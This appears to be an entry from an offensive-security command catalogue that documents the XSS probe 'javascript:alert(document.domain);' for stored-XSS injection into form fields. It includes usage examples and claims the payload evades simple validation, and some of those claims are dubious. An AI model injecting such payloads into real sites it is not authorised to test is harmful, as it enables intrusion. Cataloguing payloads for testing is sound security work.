---
data: 'javascript:alert(document.domain);'
tags:
  - xss
  - payload
  - bypass
type: command
output: 'Browser alert box showing the domain (e.g., localhost)'
executor: javascript
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:29:20.254Z'
id: 92934014-1352-43da-91fc-81ced8239bc2
verified: false
validated: true
submitted: true
---
# javascript-alert-document-domain-semicolon

## Command

```javascript
javascript:alert(document.domain);
```

## Description

This variant JavaScript payload includes a semicolon to bypass basic input duplication checks while alerting the document domain, ideal for injecting into fields with simple validation in stored XSS scenarios.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| document.domain | Retrieves the domain of the current page | Yes |
| ; | Semicolon to terminate and evade checks | Yes |

## Examples

### Basic Usage

Inject into a form field:

```javascript
javascript:alert(document.domain);
```

### Advanced Usage

Extend for stealth:

```javascript
javascript:alert(document.domain); // Silent after alert
```

## Expected Output

A browser alert dialog displays the current domain, verifying execution despite validation attempts.

## Related

- [[commands/javascript-alert-document-domain]]
- [[procedures/Inject-XSS-Payloads-into-Domain-Fields]]
